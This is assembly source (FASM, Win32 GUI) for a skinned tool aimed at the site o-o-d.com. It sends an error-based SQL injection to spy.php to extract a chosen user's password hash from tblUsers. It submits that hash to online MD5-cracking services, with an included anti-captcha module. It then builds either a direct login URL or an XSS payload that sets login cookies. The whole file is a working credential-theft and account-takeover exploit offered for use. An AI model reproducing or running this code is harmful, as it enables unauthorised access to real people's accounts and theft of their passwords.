format pe gui 4.0
include '%fasm_inc%\win32ax.inc'
include 'regexp\ctypedef.inc'
include 'regexp\AsmRegEx.inc'

struct GdiplusStartupInput
    GdiplusVersion dd ?
    DebugEventCallback dd ?
    SuppressBackgroundThread dd ?
    SuppressExternalCodecs dd ?
ends

AW_BLEND    = 80000h
AW_HIDE     = 10000h
SD_BOTH = 2

BUFF_LEN = 1348

green = 00BD32h
red   = 0FFh

IPPROTO_TCP = 0
INVALID_SOCKET = -1

IDD_MAIN = 1
ID_START = 1
ID_LOGIN = 2
ID_HASH  = 3
ID_EXIT  = 4
ID_SITE  = 5
ID_PASS  = 6
ID_LOGIN2 = 7

.data
data resource from 'res.res'
end data

; Ёлементы скина
btn1 FILE 'skin/btn1.png'
sizebtn1 = $-btn1
btn2 FILE 'skin/btn2.png'
sizebtn2 = $-btn2
btn3 FILE 'skin/btn3.png'
sizebtn3 = $-btn3

include 'regexp\AsmRegEr.inc'
include 'regexp\ctypemap.inc'

regex	  REGEX_T
regex2	  REGEX_T
regex3	  REGEX_T
regex4	  REGEX_T
hModule   dd ?
cryptdll  db 'crypt32.dll',0
CryptStringToBinaryA db 'CryptStringToBinaryA',0
qhttp	  db "GET /spy.php?spyid=42233+and+(select+count(*)+from+tblUsers+group+by+concat(':',(select+password+from+tblUsers+where+name='%s'),':',floor(rand(0)*2))) HTTP/1.1",13,10,\
	     'Host: %s',13,10,13,10,0
qhttp2	  db 'GET /crack/md5/%s HTTP/1.1',13,10,\
	     'Host: %s',13,10,13,10,0
oodlogin2 db 'http://o-o-d.com/spy.php?spyid=42233+and+',\
	     '%%22><script>document.cookie=%%22tool_login%%22%%2B%%22=%%22%%2B%%22%s%%22;',\
	     'document.cookie=%%22tool_pass%%22%%2B%%22=%%22%%2B%%22%s%%22;',\
	     'document.location.replace(%%22http://o-o-d.com/%%22);</script><a+href=%%22',0
oodlogin  db 'http://o-o-d.com/login.php?name=%s&pass=%s',0
host1	  db 'o-o-d.com',0
host2	  db 'api.dev.c0llision.net',0
host3	  db 'www.md5decrypter.co.uk',0
string	  db "entry ':[a-f0-9]+:",0
string2   db '<cracked>true</cracked>',0
string3   db 'Hashes were found',0
string4   db 'The CAPTCHA .+ is wrong',0
bn1text   db 'START',0
bn2text   db 'STOP',0
bn3text   db 'Login',0
stop	  db 0
stopped   db 1
hHash	  dd ?
hPass	  dd ?
hLogin	  dd ?
color	  dd ?
hbmp1	  dd ?
hbmp2	  dd ?
hbmp3	  dd ?
hbmpExit     dd ?
hbmpEdit     dd ?
hbmpSite1    dd ?
hbmpSite2    dd ?
oldwprocedit dd ?
oldwprocbutton dd ?
username  rb 31
passwd	  rb 64
result	  rb 35
buffer	  rb BUFF_LEN
main_hwnd dd ?
font dd ?
gdiplusSInput GdiplusStartupInput 1,0,0,0
gdiplusToken dd ?

btn1mouse dd 0
btn2mouse dd 0

hbrEdit   dd ?

wsa WSADATA

.code
start:
	stdcall crcinit,CrtTable
	invoke WSAStartup,0101h,wsa
	test eax,eax
	jne @f
	invoke GdiplusStartup,gdiplusToken,gdiplusSInput,0
	stdcall GdiLoad,btn1,sizebtn1,hbmp1,0
	test eax,eax
	je @f
	stdcall GdiLoad,btn2,sizebtn2,hbmp2,0
	test eax,eax
	je @f
	stdcall GdiLoad,btn3,sizebtn3,hbmp3,0
	test eax,eax
	je @f
	invoke LoadLibraryA,cryptdll
	invoke GetProcAddress,eax,CryptStringToBinaryA
	mov dword [CryptStringToBinaryA],eax
	invoke GetModuleHandleA,0
	mov [hModule],eax
	invoke DialogBoxParamA,eax,IDD_MAIN,HWND_DESKTOP,main,0
	invoke WSACleanup
	@@:
	invoke ExitProcess,0

proc main hwnd,msg,wparam,lparam
	cmp [msg],WM_CLOSE
	je .wmclose
	cmp [msg],WM_COMMAND
	je .wmcommand
	cmp [msg],WM_LBUTTONDOWN
	je .wmlbuttondown
	cmp [msg],WM_INITDIALOG
	je .wminitdialog
	cmp [msg],WM_DRAWITEM
	je .wmdrawitem
	cmp [msg],WM_CTLCOLOREDIT
	je .wmctlcoloredit
	xor eax,eax
	jmp .finish
     .wmctlcoloredit:
	mov eax,[hHash]
	cmp eax,[lparam]
	jne @f
	invoke SetTextColor,[wparam],[color]
	@@:
	invoke SetBkMode,[wparam],TRANSPARENT
	mov eax,[hbrEdit]
	jmp .finish
     .wmdrawitem:
	mov esi,[lparam]
	invoke CreateCompatibleDC,[esi+DRAWITEMSTRUCT.hDC]
	mov edi,eax
	mov ecx,[esi+DRAWITEMSTRUCT.CtlID]
	.if ecx=ID_START & [stop]=0
		test [esi+DRAWITEMSTRUCT.itemState],ODS_SELECTED
		je @f
		push [hbmp1]
		jmp .m1
		@@:
		.if [btn1mouse]=0
			push [hbmp2]
		.else
			push [hbmp3]
		.endif
	.elseif ecx=ID_START
		test [esi+DRAWITEMSTRUCT.itemState],ODS_SELECTED
		je @f
		push [hbmp1]
		jmp .m1
		@@:
		.if [btn1mouse]=0
			push [hbmp2]
		.else
			push [hbmp3]
		.endif
	.elseif ecx=ID_SITE
		test [esi+DRAWITEMSTRUCT.itemState],ODS_SELECTED
		je @f
		push [hbmpSite1]
		jmp .m1
		@@:
		push [hbmpSite2]
	.elseif ecx=ID_LOGIN2
		test [esi+DRAWITEMSTRUCT.itemState],ODS_SELECTED
		je @f
		push [hbmp1]
		jmp .m1
		@@:
		.if [btn2mouse]=0
			push [hbmp2]
		.else
			push [hbmp3]
		.endif
	.elseif ecx=ID_EXIT
		push [hbmpExit]
	.endif
	.m1:
	invoke SelectObject,eax
	invoke BitBlt,[esi+DRAWITEMSTRUCT.hDC],0,0,[esi+DRAWITEMSTRUCT.rcItem.right],[esi+DRAWITEMSTRUCT.rcItem.bottom],edi,0,0,SRCCOPY
	invoke DeleteDC,edi
	.if [esi+DRAWITEMSTRUCT.CtlID]<>ID_START & [esi+DRAWITEMSTRUCT.CtlID]<>ID_LOGIN2
		jmp @f
	.endif
	invoke SetBkMode,[esi+DRAWITEMSTRUCT.hDC],TRANSPARENT
	invoke SelectObject,[esi+DRAWITEMSTRUCT.hDC],[font]
	lea eax,[esi+DRAWITEMSTRUCT.rcItem]
	push DT_CENTER + DT_VCENTER + DT_SINGLELINE
	push eax
	push -1
	.if [esi+DRAWITEMSTRUCT.CtlID]=ID_START
		.if [stop]=0
			push bn1text
		.else
			push bn2text
		.endif
	.elseif [esi+DRAWITEMSTRUCT.CtlID]=ID_LOGIN2
		push bn3text
	.endif
	invoke DrawTextA,[esi+DRAWITEMSTRUCT.hDC]
	@@:
	jmp .processed
     .wminitdialog:
	mov eax,[hwnd]
	mov [main_hwnd],eax
	invoke CreateFontA,40,16,0,0,FW_MEDIUM,0,0,0,ANSI_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,PROOF_QUALITY,DEFAULT_PITCH,'Vrinda'
	mov [font],eax
	invoke GetDlgItem,[hwnd],ID_START
	invoke SetWindowLongA,eax,GWL_WNDPROC,WProcButton
	mov [oldwprocbutton],eax
	invoke GetDlgItem,[hwnd],ID_LOGIN2
	invoke SetWindowLongA,eax,GWL_WNDPROC,WProcButton
	invoke GetDlgItem,[hwnd],ID_PASS
	mov [hPass],eax
	invoke SetWindowLongA,eax,GWL_WNDPROC,WProcEdit
	mov [oldwprocedit],eax
	invoke GetDlgItem,[hwnd],ID_HASH
	mov [hHash],eax
	invoke SetWindowLongA,eax,GWL_WNDPROC,WProcEdit
	invoke GetDlgItem,[hwnd],ID_LOGIN
	mov [hLogin],eax
	invoke SetFocus,eax
	invoke LoadBitmap,[hModule],6
	mov [hbmpEdit],eax
	invoke LoadBitmap,[hModule],7
	mov [hbmpExit],eax
	invoke LoadBitmap,[hModule],9
	mov [hbmpSite1],eax
	invoke LoadBitmap,[hModule],8
	mov [hbmpSite2],eax
	invoke CreatePatternBrush,[hbmpEdit]
	mov [hbrEdit],eax
	stdcall regcomp,regex,string;(REGEX_T *regex_t, char *pattern)
	stdcall regcomp,regex2,string2;(REGEX_T *regex_t, char *pattern)
	stdcall regcomp,regex3,string3;(REGEX_T *regex_t, char *pattern)
	stdcall regcomp,regex4,string4;(REGEX_T *regex_t, char *pattern)
	xor eax,eax
	jmp .finish
     .wmlbuttondown:
	invoke ReleaseCapture
	invoke SendMessageA,[hwnd],WM_NCLBUTTONDOWN,2,0
	jmp .processed
     .wmcommand:
	.if [wparam]=BN_CLICKED shl 16 + ID_START
		.if [stop]=-1
			mov [stop],1
			mov [stopped],1
			jmp .processed
		.elseif [stop]=1
			jmp .processed
		.endif
		invoke GetDlgItem,[hwnd],ID_LOGIN2
		invoke ShowWindow,eax,SW_HIDE
		invoke ShowWindow,[hPass],SW_HIDE
		invoke RtlZeroMemory,result,35
		mov [stop],-1
		mov [stopped],0
		mov [color],green
		invoke SetDlgItemTextA,[hwnd],ID_HASH,0
		invoke CreateThread,0,0,sql1,[hwnd],0,0
		invoke CloseHandle,eax
	.elseif [wparam]=BN_CLICKED shl 16 + ID_EXIT
		invoke SetWindowLongA,[hLogin],GWL_WNDPROC,WProcEdit
		jmp .wmclose
	.elseif [wparam]=BN_CLICKED shl 16 + ID_SITE
		invoke ShellExecuteA,0,'open','http://www.zone66.su',0,0,SW_SHOWNORMAL
	.elseif [wparam]=BN_CLICKED shl 16 + ID_LOGIN2
		invoke ShellExecuteA,0,'open',buffer,0,0,SW_SHOWNORMAL
	.endif
	jmp .processed
     .wmclose:
	invoke AnimateWindow,[hwnd],500,AW_BLEND + AW_HIDE
	invoke DeleteObject,[font]
	invoke DeleteObject,[hbrEdit]
	invoke DeleteObject,[hbmp1]
	invoke DeleteObject,[hbmp2]
	invoke DeleteObject,[hbmp3]
	invoke DeleteObject,[hbmpEdit]
	invoke DeleteObject,[hbmpSite1]
	invoke DeleteObject,[hbmpSite2]
	invoke DeleteObject,[hbmpExit]
	invoke EndDialog,[hwnd],0
     .processed:
	mov eax,1
     .finish:
	ret
endp

proc WProcButton hwnd,msg,wparam,lparam
	local rect:RECT
	local id:DWORD
	invoke GetDlgCtrlID,[hwnd]
	cmp [msg],WM_ERASEBKGND
	je .finish
	.if [msg]=WM_MOUSEMOVE & [wparam]<>MK_LBUTTON
		mov [id],eax
		lea eax,[rect]
		invoke GetWindowRect,[hwnd],eax
		mov eax,[rect.right] ; X
		sub eax,[rect.left]  ; X
		mov ecx,[rect.bottom]; Y
		sub ecx,[rect.top]   ; Y
		movsx edi,word [lparam] ;X
		movsx esi,word [lparam+2] ;Y
		.if esi>ecx | esi<0 | edi>eax | edi<0
			.if [id]=ID_START
				mov eax,btn1mouse
			.elseif [id]=ID_LOGIN2
				mov eax,btn2mouse
			.endif
			.if dword [eax]<>0
				invoke ReleaseCapture
				invoke SendMessageA,[hwnd],BM_SETIMAGE,IMAGE_BITMAP,0
			.endif
		.else
			.if [id]=ID_START
				mov eax,btn1mouse
			.elseif [id]=ID_LOGIN2
				mov eax,btn2mouse
			.endif
			.if dword [eax]=0
				invoke SetCapture,[hwnd]
				.if [id]=ID_START
					mov [btn1mouse],1
				.elseif [id]=ID_LOGIN2
					mov [btn2mouse],1
				.endif
				invoke SendMessageA,[hwnd],BM_SETIMAGE,IMAGE_BITMAP,0
			.endif
		.endif
		jmp .finish
	.elseif [msg]=WM_CAPTURECHANGED
		.if eax=ID_START
			mov [btn1mouse],0
		.elseif eax=ID_LOGIN2
			mov [btn2mouse],0
		.endif
	.endif
	invoke CallWindowProc,[oldwprocbutton],[hwnd],[msg],[wparam],[lparam]
	ret
     .finish:
	xor eax,eax
	ret
endp

proc WProcEdit hwnd,msg,wparam,lparam
	mov eax,[hwnd]
	.if eax<>[hLogin]
		invoke HideCaret,[hwnd]
	.endif
	.if [msg]=WM_CHAR
		invoke GetKeyState,VK_LCONTROL
		test ax,8000h
		je .finish
		invoke GetKeyState,43h ; C
		test ax,8000h
		je .finish
	.endif
	cmp [msg],WM_CUT
	je .finish
	cmp [msg],WM_PASTE
	je .finish
	cmp [msg],WM_KEYDOWN
	je .finish
	.if [msg]=WM_PRINTCLIENT
		invoke GetDC,[hwnd]
		mov edi,eax
		invoke BitBlt,[wparam],0,0,700,300,edi,0,0,SRCCOPY
		invoke ReleaseDC,[hwnd],esi
		jmp .finish
	.endif
	mov eax,[hwnd]
	.if eax<>[hPass] | [stopped]=1
		.if [passwd]<>0 | [stopped]<>0 | [stop]<>0
			cmp [msg],WM_LBUTTONDOWN
			je .move
			cmp [msg],WM_SETCURSOR
			je .finish
		.endif
	.elseif [stop]<>0 | [passwd]=0
		cmp [msg],WM_RBUTTONDOWN
		je .finish
		cmp [msg],WM_LBUTTONDOWN
		je .move
		cmp [msg],WM_SETCURSOR
		je .finish
	.endif
	invoke CallWindowProc,[oldwprocedit],[hwnd],[msg],[wparam],[lparam]
	ret
     .move:
	SC_DRAGMOVE = 0F012h
	invoke SendMessageA,[main_hwnd],WM_SYSCOMMAND,SC_DRAGMOVE,0,0
     .finish:
	xor eax,eax
	ret
endp

proc sql1 hwnd
	invoke GetDlgItemTextA,[hwnd],ID_LOGIN,username,30
	test eax,eax
	je .exit
	invoke SetDlgItemTextA,[hwnd],ID_START,'STOP'
	invoke SetWindowLongA,[hLogin],GWL_WNDPROC,WProcEdit
	mov [oldwprocedit],eax
	cinvoke wsprintfA,buffer,qhttp,username,host1
	stdcall send1
	.if eax=0
		mov [color],red
		invoke SetDlgItemTextA,[hwnd],ID_HASH,'ERR'
		jmp .exit
	.endif
	invoke SetDlgItemTextA,[hwnd],ID_HASH,result
     .fin:
	cmp [stop],1
	je .fin2
	invoke ShowWindow,[hPass],SW_SHOW
	invoke SetWindowTextA,[hPass],'Check..'
	cinvoke wsprintfA,buffer,qhttp2,result,host2
	stdcall checkmd5,regex2,host2
	test eax,eax
	jne @f
	cmp [stop],1
	je .fin2
	stdcall acapcha
	@@:
	.if eax=0
		invoke SetWindowTextA,[hPass],'Hash Not Found'
	.else
		invoke SetWindowTextA,[hPass],passwd
	.endif
	invoke GetDlgItem,[hwnd],ID_LOGIN2
	invoke ShowWindow,eax,SW_SHOW
	.if [passwd]<>0
		stdcall urlencode,username,result,64
		push passwd
		push result
		push oodlogin
	.else
		push result
		push username
		push oodlogin2
	.endif
	cinvoke wsprintfA,buffer
      .exit:
	mov [stop],0
	invoke SetWindowLongA,[hLogin],GWL_WNDPROC,[oldwprocedit]
	invoke SetDlgItemTextA,[hwnd],ID_START,'START'
	invoke ExitThread,0
     .fin2:
	mov [color],red
	invoke SetDlgItemTextA,[hwnd],ID_PASS,'STOPPED'
	invoke SetDlgItemTextA,[hwnd],ID_HASH,'STOPPED'
	jmp .exit
endp

proc send1
	local buff:DWORD
	local hSock:DWORD
	local sin:sockaddr_in

	mov [buff],0
	push esi
	push edi
	invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
	cmp eax,INVALID_SOCKET
	je .exit
	mov [hSock],eax
	mov [sin.sin_family],AF_INET
	invoke gethostbyname,host1
	test eax,eax
	je .exit2
	mov eax,[eax+hostent.h_addr_list]
	mov eax,[eax]
	mov eax,[eax]
	mov [sin.sin_addr],eax
	invoke htons,80
	mov [sin.sin_port],ax
	lea eax,[sin]
	invoke connect,[hSock],eax,sizeof.sockaddr_in
	test eax,eax
	jne .exit2
	invoke lstrlenA,buffer
	invoke send,[hSock],buffer,eax,0
	invoke recv,[hSock],buffer,1348,0
	stdcall regexec,regex,buffer;(REGEX_T *regex_t, char *string)
	.if eax<>REGEX_NOMATCH
		mov [buff],esi
	.endif
	invoke shutdown,[hSock],SD_BOTH
      .exit2:
	invoke closesocket,[hSock]
      .exit:
	pop edi
	pop esi
	.if [buff]<>0
		jmp .ok
	.endif
	xor eax,eax
	ret
     .ok:
	mov ecx,[buff]
	dec ecx
	mov dword [ecx],0
	@@:
	dec ecx
	cmp byte [ecx-1],':'
	jne @b
	invoke lstrcpyA,result,ecx
	xor eax,eax
	inc eax
	ret
endp

proc checkmd5 regex,host
	local buff:DWORD
	local hSock:DWORD
	local sin:sockaddr_in

	mov [buff],0
	push esi
	push edi
	invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
	cmp eax,INVALID_SOCKET
	je .exit
	mov [hSock],eax
	mov [sin.sin_family],AF_INET
	invoke gethostbyname,[host]
	test eax,eax
	je .exit2
	mov eax,[eax+hostent.h_addr_list]
	mov eax,[eax]
	mov eax,[eax]
	mov [sin.sin_addr],eax
	invoke htons,80
	mov [sin.sin_port],ax
	lea eax,[sin]
	invoke connect,[hSock],eax,sizeof.sockaddr_in
	test eax,eax
	jne .exit2
	invoke lstrlenA,buffer
	invoke send,[hSock],buffer,eax,0
	invoke recv,[hSock],buffer,BUFF_LEN,0
	stdcall regexec,[regex],buffer;(REGEX_T *regex_t, char *string)
	.if eax<>REGEX_NOMATCH
		mov [buff],esi
	.endif
	invoke shutdown,[hSock],SD_BOTH
      .exit2:
	invoke closesocket,[hSock]
      .exit:
	pop edi
	pop esi
	.if [buff]<>0
		jmp .ok
	.endif
      .exit3:
	mov [passwd],0
	xor eax,eax
	ret
     .ok:
	mov eax,buffer
	lea ebx,[eax+BUFF_LEN]
	.if [host]=host2
		@@:
		inc eax
		cmp eax,ebx
		je .exit3
		cmp dword [eax],'raw>'
		jne @b
		add eax,4
		mov ecx,eax
		@@:
		inc ecx
		cmp ecx,ebx
		je .exit3
		cmp dword [ecx],'</ra'
		jne @b
		mov dword [ecx],0
		invoke lstrcpyA,passwd,eax
	.endif
	xor eax,eax
	inc eax
	ret
endp

proc GdiLoad mem,size,hbitmap,alpha
	local pIStream:DWORD
	local hIStream:DWORD
	local mem2:DWORD
	local pmem2:DWORD
	local image:DWORD

	invoke GlobalAlloc,GMEM_MOVEABLE,[size]
	test eax,eax
	je .exit0
	mov [mem2],eax
	invoke GlobalLock,eax
	mov [pmem2],eax
	invoke RtlMoveMemory,eax,[mem],[size]
	lea eax,[pIStream]
	invoke CreateStreamOnHGlobal,[pmem2],0,eax
	test eax,eax
	jne .exit1
	mov [image],0
	lea eax,[image]
	invoke GdipCreateBitmapFromStream,[pIStream],eax
	lea ecx,[hIStream]
	invoke GetHGlobalFromStream,[pIStream],ecx
	lea eax,[image]
	invoke GdipDisposeImage,eax
	mov eax,[hbitmap]
	invoke GdipCreateHBITMAPFromBitmap,[image],eax,[alpha]
	invoke GlobalUnlock,[pmem2]
	invoke GlobalFree,[mem2]
	mov eax,[image]
	ret
     .exit1:
	invoke GlobalUnlock,[pmem2]
	invoke GlobalFree,[mem2]
     .exit0:
	xor eax,eax
	ret
endp

proc urlencode text_to_convert,result_buffer,result_buffer_len
	push esi
	push edi
	push ebx
 
	mov esi,[result_buffer]
	mov edi,[text_to_convert]

    .loop_enc:
	mov eax,esi
	sub eax,[result_buffer]
	mov ebx,[result_buffer_len]
	sub ebx,4
	.if eax>=ebx
		jmp .loop_enc_end
	.endif
 
	mov al,byte [edi]
 
	.if al<80h
		.if al=' '
			mov byte [esi],'+'
			inc esi
		.elseif ((al>0 & al<=47) | (al>=58 & al<=64) | (al>=91 & al<=96) | al>=123) & al<>'.' & al<>'_' & al<>'-'
			movzx eax,al
			invoke wsprintf,esi,"%%%02X",eax
			add esi,3
		.else
			mov byte [esi],al
			inc esi
		.endif
	.else
		movzx eax,al
		invoke wsprintf,esi,"%%%02X",eax
		add esi,3
	.endif
 
	inc edi
	mov bl,byte [edi]
	test bl,bl
	jne .loop_enc
 
     .loop_enc_end:
 
	mov byte [esi],0
	pop ebx
	pop edi
	pop esi
	ret
endp

include 'anti-capcha\anti-capcha.asm'

.end start